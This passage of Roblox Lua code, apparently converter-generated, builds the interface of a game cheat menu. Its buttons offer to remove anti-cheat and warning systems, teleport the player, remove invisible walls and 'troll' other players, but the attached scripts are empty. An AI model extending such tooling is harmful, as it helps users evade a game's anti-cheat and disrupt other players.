G2L["6f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6f"]["TextSize"] = 14;
G2L["6f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6f"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["6f"]["Size"] = UDim2.new(0, 97, 0, 27);
G2L["6f"]["Name"] = [[Aut]];
G2L["6f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6f"]["Text"] = [[High Spin]];
G2L["6f"]["Position"] = UDim2.new(0.3174603283405304, 0, 0.7771739363670349, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.Aut.UIStroke
G2L["70"] = Instance.new("UIStroke", G2L["6f"]);
G2L["70"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["70"]["Thickness"] = 3;
G2L["70"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.Aut.LocalScript
G2L["71"] = Instance.new("LocalScript", G2L["6f"]);


-- StarterGui.DebugVersion.Title.script_content.Main.Aut
G2L["72"] = Instance.new("TextButton", G2L["49"]);
G2L["72"]["TextWrapped"] = true;
G2L["72"]["BorderSizePixel"] = 0;
G2L["72"]["TextScaled"] = true;
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["TextSize"] = 14;
G2L["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["72"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["72"]["Size"] = UDim2.new(0, 135, 0, 27);
G2L["72"]["Name"] = [[Aut]];
G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["Text"] = [[Remove All elevator inviswall]];
G2L["72"]["Position"] = UDim2.new(0.6164020895957947, 0, 0.7771739363670349, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.Aut.UIStroke
G2L["73"] = Instance.new("UIStroke", G2L["72"]);
G2L["73"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["73"]["Thickness"] = 3;
G2L["73"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.Aut.LocalScript
G2L["74"] = Instance.new("LocalScript", G2L["72"]);


-- StarterGui.DebugVersion.Title.script_content.Main.Aut
G2L["75"] = Instance.new("TextButton", G2L["49"]);
G2L["75"]["TextWrapped"] = true;
G2L["75"]["BorderSizePixel"] = 0;
G2L["75"]["TextScaled"] = true;
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["75"]["TextSize"] = 14;
G2L["75"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["75"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["75"]["Size"] = UDim2.new(0, 97, 0, 27);
G2L["75"]["Name"] = [[Aut]];
G2L["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["Text"] = [[TP into a generator]];
G2L["75"]["Position"] = UDim2.new(0.3174603283405304, 0, 0.6114130616188049, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.Aut.UIStroke
G2L["76"] = Instance.new("UIStroke", G2L["75"]);
G2L["76"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["Thickness"] = 3;
G2L["76"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.Aut.LocalScript
G2L["77"] = Instance.new("LocalScript", G2L["75"]);


-- StarterGui.DebugVersion.Title.script_content.Main.Aut
G2L["78"] = Instance.new("TextButton", G2L["49"]);
G2L["78"]["TextWrapped"] = true;
G2L["78"]["BorderSizePixel"] = 0;
G2L["78"]["TextScaled"] = true;
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["78"]["TextSize"] = 14;
G2L["78"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["78"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["78"]["Size"] = UDim2.new(0, 97, 0, 27);
G2L["78"]["Name"] = [[Aut]];
G2L["78"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["78"]["Text"] = [[Auto-TP to elevator]];
G2L["78"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.89673912525177, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.Aut.UIStroke
G2L["79"] = Instance.new("UIStroke", G2L["78"]);
G2L["79"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["79"]["Thickness"] = 3;
G2L["79"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.Aut.LocalScript
G2L["7a"] = Instance.new("LocalScript", G2L["78"]);


-- StarterGui.DebugVersion.Title.script_content.Main.monsters
G2L["7b"] = Instance.new("TextButton", G2L["49"]);
G2L["7b"]["TextWrapped"] = true;
G2L["7b"]["BorderSizePixel"] = 0;
G2L["7b"]["TextScaled"] = true;
G2L["7b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7b"]["TextSize"] = 14;
G2L["7b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7b"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["7b"]["Size"] = UDim2.new(0, 97, 0, 27);
G2L["7b"]["Name"] = [[monsters]];
G2L["7b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7b"]["Text"] = [[ResearchCapsule]];
G2L["7b"]["Position"] = UDim2.new(0.3174603283405304, 0, 0.42934781312942505, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.monsters.UIStroke
G2L["7c"] = Instance.new("UIStroke", G2L["7b"]);
G2L["7c"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["7c"]["Thickness"] = 3;
G2L["7c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.monsters.LocalScript
G2L["7d"] = Instance.new("LocalScript", G2L["7b"]);


-- StarterGui.DebugVersion.Title.script_content.Main.Aut
G2L["7e"] = Instance.new("TextButton", G2L["49"]);
G2L["7e"]["TextWrapped"] = true;
G2L["7e"]["TextStrokeTransparency"] = 0;
G2L["7e"]["BorderSizePixel"] = 0;
G2L["7e"]["TextScaled"] = true;
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(0, 255, 43);
G2L["7e"]["TextSize"] = 14;
G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7e"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["7e"]["Size"] = UDim2.new(0, 248, 0, 27);
G2L["7e"]["Name"] = [[Aut]];
G2L["7e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7e"]["Text"] = [[NEXT PAGE]];
G2L["7e"]["Position"] = UDim2.new(0.3174603283405304, 0, 0.89673912525177, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.Aut.UIStroke
G2L["7f"] = Instance.new("UIStroke", G2L["7e"]);
G2L["7f"]["Color"] = Color3.fromRGB(0, 154, 6);
G2L["7f"]["Thickness"] = 3;
G2L["7f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.Aut.LocalScript
G2L["80"] = Instance.new("LocalScript", G2L["7e"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo
G2L["81"] = Instance.new("Frame", G2L["3"]);
G2L["81"]["BorderSizePixel"] = 0;
G2L["81"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["81"]["BackgroundTransparency"] = 1;
G2L["81"]["Size"] = UDim2.new(0, 378, 0, 368);
G2L["81"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["81"]["Position"] = UDim2.new(0, 0, 0.05128201097249985, 0);
G2L["81"]["Visible"] = false;
G2L["81"]["Name"] = [[MainTwo]];

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player
G2L["82"] = Instance.new("TextLabel", G2L["81"]);
G2L["82"]["TextWrapped"] = true;
G2L["82"]["TextStrokeTransparency"] = 0;
G2L["82"]["BorderSizePixel"] = 0;
G2L["82"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["82"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["TextSize"] = 30;
G2L["82"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["Size"] = UDim2.new(0, 359, 0, 4);
G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["Text"] = [[InLobby]];
G2L["82"]["Name"] = [[Player]];
G2L["82"]["BackgroundTransparency"] = 1;
G2L["82"]["Position"] = UDim2.new(0.024000056087970734, 0, -0.012999990954995155, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player.UICorner
G2L["83"] = Instance.new("UICorner", G2L["82"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut
G2L["84"] = Instance.new("TextButton", G2L["81"]);
G2L["84"]["TextWrapped"] = true;
G2L["84"]["BorderSizePixel"] = 0;
G2L["84"]["TextScaled"] = true;
G2L["84"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["84"]["TextSize"] = 14;
G2L["84"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["84"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["84"]["Size"] = UDim2.new(0, 102, 0, 27);
G2L["84"]["Name"] = [[Aut]];
G2L["84"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["84"]["Text"] = [[Auto-TP to a 8 players room]];
G2L["84"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.0679347813129425, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.UIStroke
G2L["85"] = Instance.new("UIStroke", G2L["84"]);
G2L["85"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["85"]["Thickness"] = 3;
G2L["85"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.LocalScript
G2L["86"] = Instance.new("LocalScript", G2L["84"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut
G2L["87"] = Instance.new("TextButton", G2L["81"]);
G2L["87"]["TextWrapped"] = true;
G2L["87"]["BorderSizePixel"] = 0;
G2L["87"]["TextScaled"] = true;
G2L["87"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["87"]["TextSize"] = 14;
G2L["87"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["87"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["87"]["Size"] = UDim2.new(0, 124, 0, 27);
G2L["87"]["Name"] = [[Aut]];
G2L["87"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["87"]["Text"] = [[redeem All Codes (ONLY IN LOBBY)]];
G2L["87"]["Position"] = UDim2.new(0.3333333432674408, 0, 0.0679347813129425, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.UIStroke
G2L["88"] = Instance.new("UIStroke", G2L["87"]);
G2L["88"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["88"]["Thickness"] = 3;
G2L["88"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.LocalScript
G2L["89"] = Instance.new("LocalScript", G2L["87"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut
G2L["8a"] = Instance.new("TextButton", G2L["81"]);
G2L["8a"]["TextWrapped"] = true;
G2L["8a"]["BorderSizePixel"] = 0;
G2L["8a"]["TextScaled"] = true;
G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8a"]["TextSize"] = 14;
G2L["8a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8a"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["8a"]["Size"] = UDim2.new(0, 102, 0, 27);
G2L["8a"]["Name"] = [[Aut]];
G2L["8a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8a"]["Text"] = [[GO GRAZY   (For Trolling)]];
G2L["8a"]["Position"] = UDim2.new(0.7037037014961243, 0, 0.0679347813129425, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.UIStroke
G2L["8b"] = Instance.new("UIStroke", G2L["8a"]);
G2L["8b"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["8b"]["Thickness"] = 3;
G2L["8b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.LocalScript
G2L["8c"] = Instance.new("LocalScript", G2L["8a"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player
G2L["8d"] = Instance.new("TextLabel", G2L["81"]);
G2L["8d"]["TextWrapped"] = true;
G2L["8d"]["TextStrokeTransparency"] = 0;
G2L["8d"]["BorderSizePixel"] = 0;
G2L["8d"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8d"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["TextSize"] = 30;
G2L["8d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8d"]["Size"] = UDim2.new(0, 359, 0, 30);
G2L["8d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8d"]["Text"] = [[Auto-Distract (ONLY ONE)]];
G2L["8d"]["Name"] = [[Player]];
G2L["8d"]["BackgroundTransparency"] = 1;
G2L["8d"]["Position"] = UDim2.new(0.024000056087970734, 0, 0.15819565951824188, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player.UICorner
G2L["8e"] = Instance.new("UICorner", G2L["8d"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.select
G2L["8f"] = Instance.new("TextButton", G2L["81"]);
G2L["8f"]["TextWrapped"] = true;
G2L["8f"]["TextStrokeTransparency"] = 0;
G2L["8f"]["BorderSizePixel"] = 0;
G2L["8f"]["TextScaled"] = true;
G2L["8f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8f"]["TextSize"] = 14;
G2L["8f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8f"]["TextColor3"] = Color3.fromRGB(27, 255, 0);
G2L["8f"]["Size"] = UDim2.new(0, 102, 0, 27);
G2L["8f"]["Name"] = [[select]];
G2L["8f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8f"]["Text"] = [[select...]];
G2L["8f"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.239130437374115, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.select.UIStroke
G2L["90"] = Instance.new("UIStroke", G2L["8f"]);
G2L["90"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["90"]["Thickness"] = 3;
G2L["90"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.start
G2L["91"] = Instance.new("TextButton", G2L["81"]);
G2L["91"]["TextWrapped"] = true;
G2L["91"]["BorderSizePixel"] = 0;
G2L["91"]["TextScaled"] = true;
G2L["91"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["91"]["TextSize"] = 14;
G2L["91"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["91"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["91"]["Size"] = UDim2.new(0, 111, 0, 27);
G2L["91"]["Name"] = [[start]];
G2L["91"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["91"]["Text"] = [[start]];
G2L["91"]["Position"] = UDim2.new(0.3333333432674408, 0, 0.239130437374115, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.start.UIStroke
G2L["92"] = Instance.new("UIStroke", G2L["91"]);
G2L["92"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["92"]["Thickness"] = 3;
G2L["92"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.stop
G2L["93"] = Instance.new("TextButton", G2L["81"]);
G2L["93"]["TextWrapped"] = true;
G2L["93"]["BorderSizePixel"] = 0;
G2L["93"]["TextScaled"] = true;
G2L["93"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["93"]["TextSize"] = 14;
G2L["93"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["93"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["93"]["Size"] = UDim2.new(0, 124, 0, 27);
G2L["93"]["Name"] = [[stop]];
G2L["93"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["93"]["Text"] = [[stop]];
G2L["93"]["Position"] = UDim2.new(0.6613756418228149, 0, 0.239130437374115, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.stop.UIStroke
G2L["94"] = Instance.new("UIStroke", G2L["93"]);
G2L["94"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["94"]["Thickness"] = 3;
G2L["94"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.AutoDistarctHandler
G2L["95"] = Instance.new("LocalScript", G2L["81"]);
G2L["95"]["Name"] = [[AutoDistarctHandler]];

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player
G2L["96"] = Instance.new("TextLabel", G2L["81"]);
G2L["96"]["TextWrapped"] = true;
G2L["96"]["TextStrokeTransparency"] = 0;
G2L["96"]["BorderSizePixel"] = 0;
G2L["96"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["96"]["TextScaled"] = true;
G2L["96"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["96"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["96"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["96"]["TextSize"] = 30;
G2L["96"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["96"]["Size"] = UDim2.new(0, 247, 0, 30);
G2L["96"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["96"]["Text"] = [[¿¡Remove Anti-Cheat?!]];
G2L["96"]["Name"] = [[Player]];
G2L["96"]["BackgroundTransparency"] = 1;
G2L["96"]["Position"] = UDim2.new(0.0028360355645418167, 0, 0.3321087062358856, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player.UICorner
G2L["97"] = Instance.new("UICorner", G2L["96"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player
G2L["98"] = Instance.new("TextLabel", G2L["81"]);
G2L["98"]["TextWrapped"] = true;
G2L["98"]["BorderSizePixel"] = 0;
G2L["98"]["RichText"] = true;
G2L["98"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["98"]["TextScaled"] = true;
G2L["98"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["98"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["98"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["98"]["TextSize"] = 25;
G2L["98"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["98"]["Size"] = UDim2.new(0, 145, 0, 47);
G2L["98"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["98"]["Text"] = [[This will not COMPLETELY disable anti cheat.]];
G2L["98"]["Name"] = [[Player]];
G2L["98"]["BackgroundTransparency"] = 1;
G2L["98"]["Position"] = UDim2.new(0.6164020895957947, 0, 0.41847825050354004, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player.UICorner
G2L["99"] = Instance.new("UICorner", G2L["98"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.XDDDDD
G2L["9a"] = Instance.new("TextButton", G2L["81"]);
G2L["9a"]["TextWrapped"] = true;
G2L["9a"]["TextStrokeTransparency"] = 0;
G2L["9a"]["BorderSizePixel"] = 0;
G2L["9a"]["TextScaled"] = true;
G2L["9a"]["BackgroundColor3"] = Color3.fromRGB(0, 255, 43);
G2L["9a"]["TextSize"] = 14;
G2L["9a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9a"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["9a"]["Size"] = UDim2.new(0, 115, 0, 27);
G2L["9a"]["Name"] = [[XDDDDD]];
G2L["9a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9a"]["Text"] = [[NEXT PAGE]];
G2L["9a"]["Position"] = UDim2.new(0.6851850748062134, 0, 0.85597825050354, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.XDDDDD.UIStroke
G2L["9b"] = Instance.new("UIStroke", G2L["9a"]);
G2L["9b"]["Color"] = Color3.fromRGB(0, 154, 6);
G2L["9b"]["Thickness"] = 3;
G2L["9b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.XDDDDD.LocalScript
G2L["9c"] = Instance.new("LocalScript", G2L["9a"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut
G2L["9d"] = Instance.new("TextButton", G2L["81"]);
G2L["9d"]["TextWrapped"] = true;
G2L["9d"]["BorderSizePixel"] = 0;
G2L["9d"]["TextScaled"] = true;
G2L["9d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9d"]["TextSize"] = 14;
G2L["9d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9d"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["9d"]["Size"] = UDim2.new(0, 102, 0, 27);
G2L["9d"]["Name"] = [[Aut]];
G2L["9d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9d"]["Text"] = [[Remove WarnUser]];
G2L["9d"]["Position"] = UDim2.new(0.3333333432674408, 0, 0.41847825050354004, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.UIStroke
G2L["9e"] = Instance.new("UIStroke", G2L["9d"]);
G2L["9e"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["9e"]["Thickness"] = 3;
G2L["9e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.LocalScript
G2L["9f"] = Instance.new("LocalScript", G2L["9d"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player
G2L["a0"] = Instance.new("TextLabel", G2L["81"]);
G2L["a0"]["TextWrapped"] = true;
G2L["a0"]["BorderSizePixel"] = 0;
G2L["a0"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["a0"]["TextScaled"] = true;
G2L["a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a0"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a0"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a0"]["TextSize"] = 30;
G2L["a0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a0"]["Size"] = UDim2.new(0, 208, 0, 16);
G2L["a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a0"]["Text"] = [[:mod HighSpin]];
G2L["a0"]["Name"] = [[Player]];
G2L["a0"]["Visible"] = false;
G2L["a0"]["BackgroundTransparency"] = 1;
G2L["a0"]["Position"] = UDim2.new(0.20124873518943787, 0, 0.5956956744194031, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player.UICorner
G2L["a1"] = Instance.new("UICorner", G2L["a0"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player
G2L["a2"] = Instance.new("TextLabel", G2L["81"]);
G2L["a2"]["TextWrapped"] = true;
G2L["a2"]["BorderSizePixel"] = 0;
G2L["a2"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["a2"]["TextScaled"] = true;
G2L["a2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a2"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a2"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a2"]["TextSize"] = 30;
G2L["a2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a2"]["Size"] = UDim2.new(0, 208, 0, 16);
G2L["a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a2"]["Text"] = [[:mod ToggleJump]];
G2L["a2"]["Name"] = [[Player]];
G2L["a2"]["Visible"] = false;
G2L["a2"]["BackgroundTransparency"] = 1;
G2L["a2"]["Position"] = UDim2.new(0.5478096008300781, 0, 0.5956956744194031, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player.UICorner
G2L["a3"] = Instance.new("UICorner", G2L["a2"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player
G2L["a4"] = Instance.new("TextLabel", G2L["81"]);
G2L["a4"]["TextWrapped"] = true;
G2L["a4"]["BorderSizePixel"] = 0;
G2L["a4"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["a4"]["TextScaled"] = true;
G2L["a4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a4"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a4"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a4"]["TextSize"] = 30;
G2L["a4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a4"]["Size"] = UDim2.new(0, 201, 0, 16);
G2L["a4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a4"]["Text"] = [[:mod FullBright]];
G2L["a4"]["Name"] = [[Player]];
G2L["a4"]["Visible"] = false;
G2L["a4"]["BackgroundTransparency"] = 1;
G2L["a4"]["Position"] = UDim2.new(0.21957671642303467, 0, 0.6391739249229431, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player.UICorner
G2L["a5"] = Instance.new("UICorner", G2L["a4"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut
G2L["a6"] = Instance.new("TextButton", G2L["81"]);
G2L["a6"]["TextWrapped"] = true;
G2L["a6"]["BorderSizePixel"] = 0;
G2L["a6"]["TextScaled"] = true;
G2L["a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a6"]["TextSize"] = 14;
G2L["a6"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a6"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["a6"]["Size"] = UDim2.new(0, 102, 0, 27);
G2L["a6"]["Name"] = [[Aut]];
G2L["a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a6"]["Text"] = [[Remove AntiCheatTrigger]];
G2L["a6"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.41847825050354004, 0);

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.UIStroke
G2L["a7"] = Instance.new("UIStroke", G2L["a6"]);
G2L["a7"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["a7"]["Thickness"] = 3;
G2L["a7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.MainTwo.Aut.LocalScript
G2L["a8"] = Instance.new("LocalScript", G2L["a6"]);


-- StarterGui.DebugVersion.Title.script_content.MainTwo.Player
G2L["a9"] = Instance.new("TextLabel", G2L["81"]);
G2L["a9"]["TextWrapped"] = true;
G2L["a9"]["TextStrokeTransparency"] = 0;
G2L["a9"]["BorderSizePixel"] = 0;
G2L["a9"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["a9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
